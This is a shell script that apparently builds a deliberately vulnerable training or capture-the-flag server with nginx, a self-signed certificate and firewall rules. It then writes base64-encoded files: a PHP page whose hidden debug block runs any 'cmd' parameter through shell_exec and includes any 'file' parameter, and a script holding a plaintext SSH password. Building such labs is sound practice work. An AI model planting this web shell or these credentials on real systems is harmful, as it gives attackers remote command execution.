#!/bin/ash

apk add nginx nano iptables curl

echo "Configuring the firewall"

iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

/etc/init.d/iptables save
/etc/init.d/iptables restart

echo "Configuring the nginx"

config_content=$(cat <<'EOF'
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name www.empire.tld;

        return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name www.empire.tld;

    ssl_certificate /etc/ssl/certs/srv02.crt;
    ssl_certificate_key /etc/ssl/private/srv02.key;

    ssl_protocols TLSv1.2;

    location / {
      proxy_pass http://localhost:8080;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
EOF
)

echo "$config_content" | tee /etc/nginx/http.d/default.conf > /dev/null

rc-service nginx start
rc-update add nginx default

echo "Nginx configuration has been updated and the service has been restarted."

echo "Generate self-signed certificate"

openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /tmp/srv02.key -out /tmp/srv02.crt

mv /tmp/srv02.crt /etc/ssl/certs/srv02.crt
mv /tmp/srv02.key /etc/ssl/private/srv02.key

chmod 600 /etc/ssl/certs/srv02.crt
chmod 600 /etc/ssl/private/srv02.key

echo "Creating vulnerable index.php page"
echo "PCFkb2N0eXBlIGh0bWw+Cjx0aXRsZT5TaXRlIE1haW50ZW5hbmNlPC90aXRsZT4KPHN0eWxlPgogIGJvZHkgeyB0ZXh0LWFsaWduOiBjZW50ZXI7IHBhZGRpbmc6IDE1MHB4OyB9CiAgaDEgeyBmb250LXNpemU6IDUwcHg7IH0KICBib2R5IHsgZm9udDogMjBweCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7IGNvbG9yOiAjMzMzOyB9CiAgYXJ0aWNsZSB7IGRpc3BsYXk6IGJsb2NrOyB0ZXh0LWFsaWduOiBsZWZ0OyB3aWR0aDogNjUwcHg7IG1hcmdpbjogMCBhdXRvOyB9CiAgYSB7IGNvbG9yOiAjZGM4MTAwOyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IH0KICBhOmhvdmVyIHsgY29sb3I6ICMzMzM7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgfQo8L3N0eWxlPgoKPD9waHAKLy8gQ29uZmlndXJhdGlvbgokcmF0ZUxpbWl0ID0gMTA7IC8vIE51bWJlciBvZiByZXF1ZXN0cyBhbGxvd2VkIHBlciBtaW51dGUKJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiRsb2dGaWxlID0gJy90bXAvbG9nLnR4dCc7CgovLyBMb2FkIElQIHJlcXVlc3QgY291bnQgZnJvbSBsb2cgZmlsZQokbG9nRGF0YSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2dGaWxlKTsKJGxvZyA9IGpzb25fZGVjb2RlKCRsb2dEYXRhLCB0cnVlKTsKaWYgKCFpc19hcnJheSgkbG9nKSkgewogICAgJGxvZyA9IGFycmF5KCk7Cn0KCi8vIENoZWNrIGlmIElQIGlzIHJhdGUgbGltaXRlZAppZiAoaXNzZXQoJGxvZ1skaXBdKSAmJiAkbG9nWyRpcF1bJ3JlcXVlc3RzJ10gPj0gJHJhdGVMaW1pdCkgewogICAgaHR0cF9yZXNwb25zZV9jb2RlKDQyOSk7IC8vIFJldHVybiA0MjkgVG9vIE1hbnkgUmVxdWVzdHMgc3RhdHVzIGNvZGUKICAgIGRpZSgnUmF0ZSBsaW1pdCBleGNlZWRlZC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4nKTsKfQoKLy8gSW5jcmVhc2UgcmVxdWVzdCBjb3VudCBmb3IgdGhlIElQCmlmICghaXNzZXQoJGxvZ1skaXBdKSkgewogICAgJGxvZ1skaXBdID0gYXJyYXkoCiAgICAgICAgJ3JlcXVlc3RzJyA9PiAwLAogICAgICAgICdsYXN0UmVxdWVzdCcgPT4gdGltZSgpCiAgICApOwp9CiRsb2dbJGlwXVsncmVxdWVzdHMnXSsrOwokbG9nWyRpcF1bJ2xhc3RSZXF1ZXN0J10gPSB0aW1lKCk7CgovLyBTYXZlIHVwZGF0ZWQgSVAgcmVxdWVzdCBjb3VudCB0byBsb2cgZmlsZQpmaWxlX3B1dF9jb250ZW50cygkbG9nRmlsZSwganNvbl9lbmNvZGUoJGxvZykpOwo/PgoKPGFydGljbGU+CiAgICA8aDE+V2UmcnNxdW87bGwgYmUgYmFjayBzb29uITwvaDE+CiAgICA8ZGl2PgogICAgICAgIDxwPlNvcnJ5IGZvciB0aGUgaW5jb252ZW5pZW5jZSBidXQgd2UmcnNxdW87cmUgcGVyZm9ybWluZyBzb21lIG1haW50ZW5hbmNlIGF0IHRoZSBtb21lbnQuIElmIHlvdSBuZWVkIHRvIHlvdSBjYW4gYWx3YXlzIDxhIGhyZWY9Im1haWx0bzpsLnNreXdhbGtlckB0aGVmb3JjZS5sb2NhbCI+Y29udGFjdCB1czwvYT4sIG90aGVyd2lzZSB3ZSZyc3F1bztsbCBiZSBiYWNrIG9ubGluZSBzaG9ydGx5ITwvcD4KICAgICAgICA8cD4mbWRhc2g7IFRoZSBGb3JjZTwvcD4KICAgIDwvZGl2Pgo8L2FydGljbGU+Cgo8IS0tIGwuc2t5d2Fsa2VyOiBhZGRpbmcgZmlsZSBmb3IgZGVidWdnaW5nIC0tPgo8P3BocAogICAgCiAgICBpZiAoaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsKICAgCQllY2hvICI8cHJlPiI7CgkJJGZpbGUgPSAkX0dFVFsnZmlsZSddOyAgICAKCQlpbmNsdWRlKCRmaWxlKTsKICAgIAllY2hvICI8L3ByZT4iOwoJfQoKICAgIGlmIChpc3NldCgkX0dFVFsnY21kJ10pKSB7CiAgICAgICRjb21tYW5kID0gJF9HRVRbJ2NtZCddOwogICAgICBlY2hvICI8cHJlPiI7CiAgICAgIGVjaG8gc2hlbGxfZXhlYygkY29tbWFuZCk7CiAgICAgIGVjaG8gIjwvcHJlPiI7CiAgICB9Cj8+Cg==" | base64 -d | tee /var/www/localhost/htdocs/index.php

echo "Creating priv esc vector, password reuse"
echo "CiMgdXNlZCB0byBjb3B5IHRoZSB3ZWIgYXBwISBkb24ndCBmb3JnZXQgdG8gZGVsZXRlIGl0ISEKCnNzaHBhc3MgLWYgIlBhc3N3b3JkMTIzIiBzY3AgL3Zhci93d3cvZGV2L2FwcC56aXAgZGV2ZWxvcGVyQDE5Mi4xNjguMTAuMTA6L3Zhci93d3cvbG9jYWxob3N0L2h0ZG9jcy9hcHAuemlwCg=="  | base64 -d | tee /opt/copy_app.sh

echo "Configuration is done!"

